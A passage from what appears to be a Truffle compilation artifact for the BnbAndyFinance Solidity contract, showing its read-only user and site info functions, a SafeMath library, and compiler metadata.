plans[user.deposits[index].plan].time.mul(TIME_STEP)\r\n        );\r\n    }\r\n\r\n    function getUserActions(\r\n        address userAddress,\r\n        uint256 index\r\n    ) public view returns (uint8[] memory, uint256[] memory, uint256[] memory) {\r\n        require(index > 0, \"wrong index\");\r\n        User storage user = users[userAddress];\r\n        uint256 start;\r\n        uint256 end;\r\n        uint256 cnt = 50;\r\n\r\n        start = (index - 1) * cnt;\r\n        if (user.actions.length < (index * cnt)) {\r\n            end = user.actions.length;\r\n        } else {\r\n            end = index * cnt;\r\n        }\r\n\r\n        uint8[] memory types = new uint8[](end - start);\r\n        uint256[] memory amount = new uint256[](end - start);\r\n        uint256[] memory date = new uint256[](end - start);\r\n\r\n        for (uint256 i = start; i < end; i++) {\r\n            types[i - start] = user.actions[i].types;\r\n            amount[i - start] = user.actions[i].amount;\r\n            date[i - start] = user.actions[i].date;\r\n        }\r\n        return (types, amount, date);\r\n    }\r\n\r\n    function getUserActionLength(\r\n        address userAddress\r\n    ) public view returns (uint256) {\r\n        return users[userAddress].actions.length;\r\n    }\r\n\r\n    function getSiteInfo()\r\n        public\r\n        view\r\n        returns (uint256 _totalInvested, uint256 _totalBonus)\r\n    {\r\n        return (\r\n            totalInvested,\r\n            totalInvested.mul(TOTAL_REF).div(PERCENTS_DIVIDER)\r\n        );\r\n    }\r\n\r\n    function getUserInfo(\r\n        address userAddress\r\n    )\r\n        public\r\n        view\r\n        returns (\r\n            uint256 totalDeposit,\r\n            uint256 totalWithdrawn,\r\n            uint256 totalReferrals\r\n        )\r\n    {\r\n        return (\r\n            getUserTotalDeposits(userAddress),\r\n            getUserTotalWithdrawn(userAddress),\r\n            getUserTotalReferrals(userAddress)\r\n        );\r\n    }\r\n\r\n    function isContract(address addr) internal view returns (bool) {\r\n        uint256 size;\r\n        assembly {\r\n            size := extcodesize(addr)\r\n        }\r\n        return size > 0;\r\n    }\r\n}\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b <= a, \"SafeMath: subtraction overflow\");\r\n        uint256 c = a - b;\r\n\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b > 0, \"SafeMath: division by zero\");\r\n        uint256 c = a / b;\r\n\r\n        return c;\r\n    }\r\n}\r\n",
  "sourcePath": "C:\\Users\\Sait\\Documents\\GitHub\\ZeppelinProject\\truffleautoprojectBnbAndyFinance\\contracts\\BnbAndyFinance.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.18+commit.87f61d96.Emscripten.clang"
  },
  "schemaVersion": "3.4.15",
  "updatedAt": "2023-09-27T05:57:58.149Z",
  "networkType": "ethereum",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}